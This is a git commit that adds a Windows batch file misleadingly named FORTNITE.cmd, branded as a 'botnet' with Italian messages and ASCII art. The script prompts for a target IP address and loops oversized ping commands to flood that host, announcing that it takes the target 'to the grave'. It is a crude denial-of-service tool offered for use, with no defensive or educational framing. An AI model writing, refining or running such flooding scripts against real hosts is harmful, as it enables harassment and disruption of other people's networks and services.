b0352b6c9492f3cc8883316548ac728858fc4f7e
ChaosVinny <99658960+ChaosVinny@users.noreply.github.com>
2022-02-14 14:35:58 +0100

    Add files via upload

---
+++ FORTNITE.cmd
@@ -0,0 +1,105 @@
+@echo off
+color 5
+title Sub to https://www.youtube.com/channel/UCVZXDOEmlGsN7G7ArE1qFvQ
+echo =====================================================
+echo           La morte di Zerotwo Botnet
+echo =====================================================
+echo MMMMMMMMMMMMMMMNmdhhyysssssssyyhdmNMMMMMMMMMMMMMMM
+echo MMMMMMMdysssoooooooooo++++++++++oooo+++/+ohMMMMMMM
+echo MMMMMmysooooooo+++++++ooooo+++ooooo+/::///+odMMMMM
+echo MMMMhssssosoo++++++++o+++++++++oooooo//////+oyNMMM
+echo MMNy/:::::+oooo++/:-::--/+/:----:oooooo/---::oyNMM
+echo MNys:.....-o++++/:......yo+......s+++++-.....osyNM
+echo Mysoo-...../+///:......s+//......s/////-.....ossyM
+echo msooo+......+///......+o:::......s/////-.....ooosm
+echo yooo++/.....-+/-.....:s::::..................ooooy
+echo ooo++++:.....//.....-s:----..................ooooo
+echo oo++++//.`````.`````s/://+/``````-:::::.`````o++oo
+echo soo++////.`````````oo+ooooo``````sooooo.`````o+++o
+echo dyyyssooo+.```````:yooooooo.`````ssssss:`````osssh
+echo myyyyyysss/......-yoooooooo:::///sssssyo//::-oyyym
+echo Mhyyyyyyyyy+:::::syssssssss+/////syssyyo/////oyyhM
+echo MNhyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyhNM
+echo MMNhhhhhhhhhyyyyyyyyyyyyyyyyyyyhhhhhhhhhhhhhhhdNMM
+echo MMMMmdddhhhhhhhhhhhhhhhhhhhhhhhhhhhhdddddddddmMMMM
+echo MMMMMNddddddddddddddddddddddddddddddddddddddNMMMMM
+echo MMMMMMMNddddddddddddddddddddddddddddddddddNMMMMMMM
+echo MMMMMMMMMMMMMMMMNNmmmddddddddmmmNNMMMMMMMMMMMMMMMM
+echo.
+echo.
+echo.
+:hub
+set /p var=Enter IP~
+title Preparing To Take ~%var%~ To The Grave
+echo ================================
+echo Pinging Target IP "%var%"
+echo ================================
+:d
+echo ==================================
+echo %var% sta subendo l'abuso da Parte della Botnet
+echo ==================================
+:x
+ping  -l 9999 -w 10 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+color 5
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 1250 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+color e
+cls
+GoTo d
+:f
+color 40            
+echo _____  ____  ____  __    ____  _  _  ____ 
+echo (  _  )( ___)( ___)(  )  (_  _)( \( )( ___)
+echo )(_)(  )__)  )__)  )(__  _)(_  )  (  )__) 
+echo (_____)(__)  (__)  (____)(____)(_)\_)(____)                          
+color 04
+goto x
